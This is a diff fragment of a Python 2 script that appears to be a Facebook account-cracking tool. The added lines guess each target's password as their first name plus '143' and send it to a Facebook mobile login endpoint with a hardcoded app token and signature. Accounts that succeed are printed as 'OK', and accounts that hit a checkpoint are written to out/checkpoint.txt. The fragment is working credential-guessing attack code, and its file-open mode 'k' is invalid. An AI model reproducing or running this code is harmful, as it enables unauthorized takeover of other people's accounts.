@@ -417,6 +417,20 @@ def pilih_super():
 														cek.write(user+"|"+pass10+"\n")
 														cek.close()
 														cekpoint.append(user+pass10)
+													else:
+														pass11 = y['first_name'] + '143'
+														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+														s = json.load(data)
+														if 'access_token' in s:
+															print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass11 + '\x1b[1;92m | ' + y['name']
+															oks.append(user+pass11)
+														else:
+															if 'www.facebook.com' in s["error_msg"]:
+																print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass11 + '\x1b[1;36;40m | \033[1;37m' + y['name']
+																cek = open("out/checkpoint.txt", "k")
+																cek.write(user+"|"+pass11+"\n")
+																cek.close()
+																cekpoint.append(user+pass11)
 												
 					
 		except:																		
